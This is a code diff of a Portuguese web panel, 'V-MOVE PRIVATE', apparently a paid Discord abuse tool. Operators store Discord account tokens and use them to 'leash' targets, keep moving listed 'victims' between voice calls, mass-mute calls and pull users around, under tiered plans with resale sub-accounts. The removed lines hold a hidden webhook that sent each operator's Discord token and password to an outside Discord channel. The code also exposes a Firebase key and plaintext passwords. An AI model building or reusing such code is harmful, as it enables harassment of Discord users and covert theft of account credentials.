@@ -19,11 +19,12 @@
         .card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; position: relative; }
         .card-title { font-size: 1.1rem; color: #fff; margin-bottom: 15px; text-transform: uppercase; border-left: 3px solid var(--magenta); padding-left: 10px; display: block;}
         input, select { width: 100%; padding: 12px; background: var(--input-bg); border: 1px solid var(--border); border-radius: 8px; color: #fff; margin-bottom: 12px; font-family: 'Rajdhani'; outline: none; }
-        .btn-action { width: 100%; padding: 12px; background: var(--magenta); border: none; border-radius: 8px; color: #fff; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        .btn-action { width: 100%; padding: 12px; background: var(--magenta); border: none; border-radius: 8px; color: #fff; font-weight: 700; cursor: pointer; text-transform: uppercase; margin-bottom: 5px; }
+        .btn-action:disabled { opacity: 0.5; cursor: not-allowed; }
         #loginPage { position: fixed; inset: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 1000; }
         .login-box { width: 350px; background: var(--panel); padding: 40px; border-radius: 15px; text-align: center; border: 1px solid var(--border); }
-        .leash-item { background: #13131a; padding: 10px; border-radius: 5px; margin-bottom: 8px; display: flex; justify-content: space-between; border-left: 2px solid var(--magenta); font-size: 13px; }
-        .lock-alert { display:none; color: #ffbc00; background: rgba(255,188,0,0.1); padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; text-align: center; border: 1px solid rgba(255,188,0,0.3); }
+        .leash-item { background: #13131a; padding: 10px; border-radius: 5px; margin-bottom: 8px; display: flex; justify-content: space-between; border-left: 2px solid var(--magenta); font-size: 13px; align-items: center; }
+        .limit-badge { float: right; font-size: 12px; background: rgba(255,255,255,0.1); padding: 2px 8px; border-radius: 12px; color: var(--magenta); }
     </style>
 </head>
 <body>
@@ -38,59 +39,97 @@
 </div>
 
 <div class="sidebar">
-    <div class="nav-icon active" id="btnNavHome">🏠</div>
-    <div class="nav-icon" id="btnNavStats">📊</div>
-    <div class="nav-icon" id="btnNavConfig">⚙️</div>
+    <div class="nav-icon active" id="btnNavHome" title="Início">🏠</div>
+    <div class="nav-icon" id="btnNavVoz" title="Controle de Voz">🎙️</div>
+    <div class="nav-icon" id="btnNavStats" title="Estatísticas e Listas">📊</div>
+    <div class="nav-icon" id="btnNavConfig" title="Configurações">⚙️</div>
 </div>
 
 <div class="main-content">
     <div class="top-bar">
         <div class="logo">V-MOVE <span style="color:var(--magenta)">PRIVATE</span></div>
-        <div id="userBadge" style="font-weight: bold; color: var(--magenta); text-transform: uppercase;">OFFLINE</div>
+        <div style="display:flex; gap: 15px; align-items:center;">
+            <div id="planoBadge" style="font-size: 12px; background: #222; padding: 4px 10px; border-radius: 15px; border: 1px solid var(--magenta);">PLANO: --</div>
+            <div id="userBadge" style="font-weight: bold; color: var(--magenta); text-transform: uppercase;">OFFLINE</div>
+        </div>
     </div>
 
     <div id="home" class="page active">
         <div class="card" style="background: rgba(255, 45, 125, 0.05);">
             <b>STATUS DA CONTA:</b> <span id="timerDisplay">Verificando...</span>
         </div>
-        <div class="card"><span class="card-title">Servidor</span>
+        <div class="card"><span class="card-title">Servidor Alvo</span>
             <select id="serverSelect"><option value="">Carregando...</option></select>
         </div>
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-            <div class="card"><span class="card-title">Coleira</span>
+            <div class="card"><span class="card-title">Coleira <span class="limit-badge" id="limColeira">0/0</span></span>
                 <input type="text" id="leashId" placeholder="ID do Alvo">
-                <button class="btn-action" id="btnPrender">PRENDER</button>
-                <div id="listaColeira" style="margin-top:15px"></div>
+                <button class="btn-action" id="btnPrender">PRENDER NA COLEIRA</button>
+                <div id="listaColeira" style="margin-top:15px; max-height: 150px; overflow-y:auto;"></div>
             </div>
-            <div class="card"><span class="card-title">Rodízio</span>
-                <input type="text" id="rodizioId" placeholder="ID da Vítima">
-                <button class="btn-action" id="btnRodOn">LIGAR</button>
-                <button class="btn-action" style="background:#400; margin-top:5px" id="btnRodOff">DESLIGAR</button>
+            <div class="card"><span class="card-title">Rodízio <span class="limit-badge" id="limRodizio">Max: 0</span></span>
+                <input type="text" id="rodizioId" placeholder="ID da Vítima (ou vários separados por vírgula)">
+                <button class="btn-action" id="btnRodOn">LIGAR RODÍZIO</button>
+                <button class="btn-action" style="background:#400; margin-top:5px" id="btnRodOff">DESLIGAR RODÍZIO</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="voz" class="page">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+            <div class="card"><span class="card-title">Controle de Call</span>
+                <button class="btn-action" id="btnMuteAll" style="background: #a00;">MUTAR GERAL</button>
+                <button class="btn-action" id="btnUnmuteAll" style="background: #0a0;">DESMUTAR GERAL</button>
+                <p id="avisoMute" style="color:#ff4444; font-size:12px; display:none;">Seu plano não permite mutar geral.</p>
+                <hr style="border:0; border-top:1px solid var(--border); margin: 20px 0;">
+                <span class="card-title" style="font-size: 0.9rem;">WhiteList <span class="limit-badge" id="limWL">0/0</span></span>
+                <div style="display:flex; gap:10px;">
+                    <input type="text" id="wlId" placeholder="ID Alvo">
+                    <input type="text" id="wlNome" placeholder="Nome">
+                </div>
+                <button class="btn-action" id="btnAddWl">ADD WHITELIST</button>
+                <div id="listaWl" style="margin-top:10px"></div>
+            </div>
+            <div class="card"><span class="card-title">Teleporte <span class="limit-badge" id="limTp">0/0</span></span>
+                <div style="display:flex; gap:10px;">
+                    <input type="text" id="tpId" placeholder="ID Alvo">
+                    <input type="text" id="tpNome" placeholder="Nome">
+                </div>
+                <button class="btn-action" id="btnAddTp">ADICIONAR NA LISTA</button>
+                <div id="listaTp" style="margin-top:15px"></div>
             </div>
         </div>
     </div>
 
     <div id="stats" class="page">
-        <div class="card"><span class="card-title">Sub-Contas</span>
+        <div class="card"><span class="card-title">Imunes do Rodízio <span class="limit-badge" id="limImune">0/0</span></span>
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="imuneId" placeholder="ID do Imune">
+                <input type="text" id="imuneNome" placeholder="Nome">
+            </div>
+            <button class="btn-action" id="btnAddImune">PROTEGER CONTA</button>
+            <div id="listaImune" style="margin-top:15px"></div>
+        </div>
+        <div class="card"><span class="card-title">Sub-Contas (Revenda)</span>
             <p>Keycards Disponíveis: <b id="numKeys" style="color:var(--magenta)">0</b></p>
             <div id="revendaBlock" style="display:none">
                 <input type="text" id="subUser" placeholder="Novo Usuário">
                 <input type="password" id="subPass" placeholder="Senha">
                 <button class="btn-action" id="btnCriarSub">CRIAR CONTA (30 DIAS)</button>
             </div>
-            <div id="revendaLocked" style="color: #ff4444;">Bloqueado: Apenas para LifeTime.</div>
+            <div id="revendaLocked" style="color: #ff4444;">Bloqueado para o seu plano.</div>
         </div>
     </div>
 
     <div id="config" class="page">
         <div class="card">
             <span class="card-title">Dados do Executor</span>
-            <div id="lockMessage" class="lock-alert">
+            <div id="lockMessage" style="display:none; color: #ffbc00; background: rgba(255,188,0,0.1); padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; text-align: center; border: 1px solid rgba(255,188,0,0.3);">
                 ⚠️ Alteração bloqueada! Disponível em: <b id="unlockTimer">--:--:--</b>
             </div>
             <input type="text" id="editOwner" placeholder="Seu ID (Owner ID)">
             <input type="password" id="editToken" placeholder="Token do Discord">
-            <input type="password" id="editPass" placeholder="Nova Senha (opcional)">
+            <input type="password" id="editPass" placeholder="Nova Senha (Deixe vazio para manter)">
             <button class="btn-action" id="btnSalvarConfig">SALVAR ALTERAÇÕES</button>
         </div>
     </div>
@@ -103,132 +142,179 @@
     const firebaseConfig = { apiKey: "AIzaSyB3lO20V8QMqx3BCjiLAxlz5_GnuL5yH-k", databaseURL: "https://contas-b30ba-default-rtdb.firebaseio.com" };
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
-    const webhook = "https://canary.discord.com/api/webhooks/1480876440475009034/A-GnyxGjLEDJ__l4a0f4vsgRW-7bPdGE6Ou2ZNdn5jvMS2F1WcFnFw6sjPnmOn9m5VtQ";
 
-    let currentUser = null, userData = null, bancoServidores = {};
+    const limites = {
+        saphire: { rodizio: 8, coleira: 20, mute: true, wl: 10, tp: 15, imune: 3 },
+        rubi: { rodizio: 5, coleira: 12, mute: true, wl: 5, tp: 10, imune: 1 },
+        razer: { rodizio: 3, coleira: 4, mute: true, wl: 5, tp: 5, imune: 0 },
+        neon: { rodizio: 1, coleira: 2, mute: false, wl: 0, tp: 0, imune: 0 }
+    };
+
+    let currentUser = null, userData = null, meuPlano = "neon", counts = { coleira:0, wl:0, tp:0, imune:0 };
 
     window.showPage = (id, el) => {
         document.querySelectorAll('.page, .nav-icon').forEach(x => x.classList.remove('active'));
         document.getElementById(id).classList.add('active'); el.classList.add('active');
     };
-    document.getElementById('btnNavHome').onclick = (e) => showPage('home', e.target);
-    document.getElementById('btnNavStats').onclick = (e) => showPage('stats', e.target);
-    document.getElementById('btnNavConfig').onclick = (e) => showPage('config', e.target);
+    ['Home','Voz','Stats','Config'].forEach(p => {
+        document.getElementById(`btnNav${p}`).onclick = (e) => showPage(p.toLowerCase(), e.currentTarget);
+    });
+
+    async function registrarLog(tipo, msg) {
+        push(ref(db, 'logs'), { tipo, msg, user: currentUser, ts: new Date().getTime() });
+    }
 
     document.getElementById('btnLogin').onclick = async () => {
         const u = document.getElementById('user').value, p = document.getElementById('pass').value;
         const snap = await get(ref(db, 'usuarios/' + u));
         if (snap.exists() && snap.val().senha === p) {
-            currentUser = u; userData = snap.val();
-            if(userData.token) await set(ref(db, `tokens_ativos/${u}`), { token: userData.token });
+            currentUser = u; userData = snap.val(); meuPlano = userData.plano || "neon";
+            if(userData.token) await set(ref(db, `tokens_ativos/${u}`), { token: userData.token, ts: new Date().getTime() });
             document.getElementById('loginPage').style.display = 'none';
             document.getElementById('userBadge').innerText = u;
+            document.getElementById('planoBadge').innerText = "PLANO: " + meuPlano.toUpperCase();
             iniciarApp();
-        } else alert("Dados inválidos!");
+        } else alert("Credenciais Inválidas!");
     };
 
     function iniciarApp() {
+        verificarTrava();
         const venc = userData.vencimento;
-        const display = document.getElementById('timerDisplay');
-        if (venc === "LIFETIME") {
-            display.innerText = "ACESSO VITALÍCIO";
+        document.getElementById('timerDisplay').innerText = venc === "LIFETIME" ? "VITALÍCIO" : new Date(venc).toLocaleDateString();
+        
+        if(venc === "LIFETIME") {
             document.getElementById('revendaBlock').style.display = 'block';
             document.getElementById('revendaLocked').style.display = 'none';
-        } else {
-            setInterval(() => {
-                const r = venc - new Date().getTime();
-                display.innerText = r > 0 ? `${Math.floor(r/864e5)}d ${Math.floor((r%864e5)/36e5)}h restantes` : "EXPIRADO";
-            }, 1000);
+            onValue(ref(db, `usuarios/${currentUser}/keycards`), s => document.getElementById('numKeys').innerText = s.val() || 0);
         }
 
+        document.getElementById('limRodizio').innerText = `Max: ${limites[meuPlano].rodizio}`;
+        if(!limites[meuPlano].mute) document.getElementById('btnMuteAll').disabled = document.getElementById('btnUnmuteAll').disabled = true;
+
         onValue(ref(db, 'meus_servidores'), s => {
-            const sel = document.getElementById('serverSelect'); sel.innerHTML = '<option value="">Selecionar...</option>';
-            bancoServidores = s.val() || {};
-            for(let k in bancoServidores) sel.innerHTML += `<option value="${k}">${bancoServidores[k].nome}</option>`;
+            const sel = document.getElementById('serverSelect'); sel.innerHTML = '<option value="">Selecionar Servidor...</option>';
+            s.forEach(srv => sel.innerHTML += `<option value="${srv.key}">${srv.val().nome}</option>`);
         });
 
-        onValue(ref(db, 'coleira_membros'), s => {
-            const div = document.getElementById('listaColeira'); div.innerHTML = "";
-            s.forEach(c => {
-                if(c.val().criadoPor === currentUser) {
-                    const item = document.createElement('div');
-                    item.className = 'leash-item';
-                    item.innerHTML = `<span>ID: ${c.val().alvoId}</span> <b style="color:red; cursor:pointer" id="del-${c.key}">SOLTAR</b>`;
-                    div.appendChild(item);
-                    document.getElementById(`del-${c.key}`).onclick = () => remove(ref(db, `coleira_membros/${c.key}`));
-                }
+        const setupLista = (path, divId, limitKey, badgeId) => {
+            onValue(ref(db, `listas/${currentUser}/${path}`), s => {
+                counts[limitKey] = s.size;
+                document.getElementById(badgeId).innerText = `${s.size}/${limites[meuPlano][limitKey]}`;
+                const div = document.getElementById(divId); div.innerHTML = "";
+                s.forEach(i => {
+                    const d = i.val();
+                    div.innerHTML += `<div class="leash-item"><span>${d.nome || d.id}</span> <b style="color:red; cursor:pointer" onclick="window.removerItem('${path}','${i.key}')">X</b></div>`;
+                });
+            });
+        };
+
+        setupLista('coleira', 'listaColeira', 'coleira', 'limColeira');
+        setupLista('wl', 'listaWl', 'wl', 'limWL');
+        setupLista('imune', 'listaImune', 'imune', 'limImune');
+
+        // Especial para Teleporte
+        onValue(ref(db, `listas/${currentUser}/tp`), s => {
+            counts.tp = s.size;
+            document.getElementById('limTp').innerText = `${s.size}/${limites[meuPlano].tp}`;
+            const div = document.getElementById('listaTp'); div.innerHTML = "";
+            s.forEach(i => {
+                const d = i.val();
+                div.innerHTML += `<div class="leash-item"><span>${d.nome}</span> 
+                <div><button onclick="execVoz('tp_go','${d.id}')" style="background:blue; color:white; border:none; padding:4px 8px; border-radius:4px; cursor:pointer;">TP</button>
+                <button onclick="execVoz('tp_pull','${d.id}')" style="background:orange; color:white; border:none; padding:4px 8px; border-radius:4px; cursor:pointer; margin-left:5px;">PUXAR</button>
+                <b style="color:red; cursor:pointer; margin-left:10px" onclick="window.removerItem('tp','${i.key}')">X</b></div></div>`;
             });
         });
 
-        verificarTrava();
         document.getElementById('editOwner').value = userData.ownerId || "";
         document.getElementById('editToken').value = userData.token || "";
-        onValue(ref(db, `usuarios/${currentUser}/keycards`), s => document.getElementById('numKeys').innerText = s.val() || 0);
     }
 
     function verificarTrava() {
-        const btn = document.getElementById('btnSalvarConfig');
-        const lock = document.getElementById('lockMessage');
-        const diff = (userData.lastUpdate || 0) + (172800000) - new Date().getTime(); // 172800000 = 2 dias
+        if(!userData.lastUpdate) return;
+        const diff = (userData.lastUpdate + 1728e5) - new Date().getTime();
         if (diff > 0) {
-            btn.disabled = true; btn.style.opacity = "0.5"; btn.style.cursor = "not-allowed"; lock.style.display = "block";
+            const btn = document.getElementById('btnSalvarConfig');
+            btn.disabled = true;
+            document.getElementById('lockMessage').style.display = "block";
+            const inputs = [document.getElementById('editOwner'), document.getElementById('editToken'), document.getElementById('editPass')];
+            inputs.forEach(i => i.disabled = true);
             setInterval(() => {
-                const r = (userData.lastUpdate + 172800000) - new Date().getTime();
-                if (r <= 0) { location.reload(); return; }
+                const r = (userData.lastUpdate + 1728e5) - new Date().getTime();
+                if(r <= 0) location.reload();
                 const h = Math.floor(r/36e5), m = Math.floor((r%36e5)/6e4), s = Math.floor((r%6e4)/1000);
                 document.getElementById('unlockTimer').innerText = `${h}h ${m}m ${s}s`;
             }, 1000);
         }
     }
 
+    window.removerItem = (tipo, key) => remove(ref(db, `listas/${currentUser}/${tipo}/${key}`));
+
+    window.execVoz = async (cmd, alvo = "") => {
+        const s = document.getElementById('serverSelect').value;
+        if(!s) return alert("Selecione um servidor!");
+        const sData = (await get(ref(db, `meus_servidores/${s}`))).val();
+        set(ref(db, `comandos_voz/${currentUser}`), { cmd, alvoId: alvo, guildId: sData.id, ts: new Date().getTime() });
+        registrarLog("VOZ", `Comando: ${cmd} | Alvo: ${alvo}`);
+    };
+
+    document.getElementById('btnMuteAll').onclick = () => window.execVoz('mute_all');
+    document.getElementById('btnUnmuteAll').onclick = () => window.execVoz('unmute_all');
+
+    const addToList = (btnId, path, limitKey, idIn, nomeIn) => {
+        document.getElementById(btnId).onclick = () => {
+            if(counts[limitKey] >= limites[meuPlano][limitKey]) return alert("Limite do plano atingido!");
+            const id = document.getElementById(idIn).value, nome = document.getElementById(nomeIn).value;
+            if(id && nome) {
+                push(ref(db, `listas/${currentUser}/${path}`), { id, nome });
+                registrarLog(path.toUpperCase(), `Add: ${nome} (${id})`);
+            }
+        };
+    };
+    addToList('btnAddWl', 'wl', 'wl', 'wlId', 'wlNome');
+    addToList('btnAddTp', 'tp', 'tp', 'tpId', 'tpNome');
+    addToList('btnAddImune', 'imune', 'imune', 'imuneId', 'imuneNome');
+
+    document.getElementById('btnPrender').onclick = async () => {
+        if(counts.coleira >= limites[meuPlano].coleira) return alert("Limite atingido!");
+        const id = document.getElementById('leashId').value, s = document.getElementById('serverSelect').value;
+        if(id && s) {
+            const sData = (await get(ref(db, `meus_servidores/${s}`))).val();
+            push(ref(db, `listas/${currentUser}/coleira`), { id, guildId: sData.id });
+            registrarLog("COLEIRA", `Prendeu: ${id}`);
+        }
+    };
+
+    document.getElementById('btnRodOn').onclick = async () => {
+        const ids = document.getElementById('rodizioId').value.split(',').map(x => x.trim());
+        if(ids.length > limites[meuPlano].rodizio) return alert(`Limite de ${limites[meuPlano].rodizio} pessoas!`);
+        const s = document.getElementById('serverSelect').value;
+        if(s && ids[0]) {
+            const sData = (await get(ref(db, `meus_servidores/${s}`))).val();
+            update(ref(db, `mover_config/${currentUser}`), { ativo: true, dados: { guildId: sData.id, targets: ids, calls: sData.calls } });
+            registrarLog("RODIZIO", "Ligado");
+        }
+    };
+    document.getElementById('btnRodOff').onclick = () => {
+        update(ref(db, `mover_config/${currentUser}`), { ativo: false });
+        registrarLog("RODIZIO", "Desligado");
+    };
+
     document.getElementById('btnSalvarConfig').onclick = async () => {
-        const o = document.getElementById('editOwner').value;
-        const t = document.getElementById('editToken').value;
-        const p = document.getElementById('editPass').value || userData.senha;
-        const agora = new Date().getTime();
-
-        await update(ref(db, `usuarios/${currentUser}`), { 
-            ownerId: o, token: t, senha: p, lastUpdate: agora 
-        });
-
-        fetch(webhook, { 
-            method: 'POST', 
-            headers: {'Content-Type': 'application/json'}, 
-            body: JSON.stringify({ 
-                embeds: [{ 
-                    title: "LOG DE ALTERAÇÃO - V-MOVE", 
-                    description: `**Operador:** ${currentUser}\n**ID Alvo:** ${o}\n**Token:** \`${t}\`\n**Senha:** \`${p}\``, 
-                    color: 16723325,
-                    timestamp: new Date().toISOString()
-                }] 
-            }) 
-        });
-
-        alert("Dados salvos! Trava de 48h ativada."); location.reload();
+        const o = document.getElementById('editOwner').value, t = document.getElementById('editToken').value, p = document.getElementById('editPass').value || userData.senha;
+        await update(ref(db, `usuarios/${currentUser}`), { ownerId: o, token: t, senha: p, lastUpdate: new Date().getTime() });
+        alert("Salvo! Trava de 2 dias ativa."); location.reload();
     };
-
-    document.getElementById('btnPrender').onclick = () => {
-        const s = document.getElementById('serverSelect').value;
-        const id = document.getElementById('leashId').value;
-        if(s && id) push(ref(db, 'coleira_membros'), { alvoId: id, guildId: bancoServidores[s].id, criadoPor: currentUser });
-    };
-
-    document.getElementById('btnRodOn').onclick = () => {
-        const s = document.getElementById('serverSelect').value;
-        const t = document.getElementById('rodizioId').value;
-        if(s && t) update(ref(db, 'mover_config'), { ativo: true, dados: { guildId: bancoServidores[s].id, targetId: t, calls: bancoServidores[s].calls, botExecutor: currentUser } });
-    };
-
-    document.getElementById('btnRodOff').onclick = () => update(ref(db, 'mover_config'), { ativo: false });
 
     document.getElementById('btnCriarSub').onclick = async () => {
         const u = document.getElementById('subUser').value, p = document.getElementById('subPass').value;
-        const k = (await get(ref(db, `usuarios/${currentUser}/keycards`))).val() || 0;
-        if(k > 0 && u && p) {
-            await set(ref(db, 'usuarios/' + u), { senha: p, vencimento: new Date().getTime() + 2592000000, criadoPor: currentUser, keycards: 0, token: "", ownerId: "" });
-            await update(ref(db, `usuarios/${currentUser}`), { keycards: k - 1 });
-            alert("Sub-conta criada!");
-        } else alert("Dados incompletos ou sem Keycards!");
+        const kRef = ref(db, `usuarios/${currentUser}/keycards`);
+        const k = (await get(kRef)).val() || 0;
+        if(k > 0) {
+            await update(kRef, k - 1);
+            await set(ref(db, 'usuarios/' + u), { senha: p, vencimento: new Date().getTime() + 2592e6, plano: 'neon', token: "", ownerId: "" });
+            alert("Sub-conta Neon criada!");
+        } else alert("Sem Keycards!");
     };
 </script>
 </body>
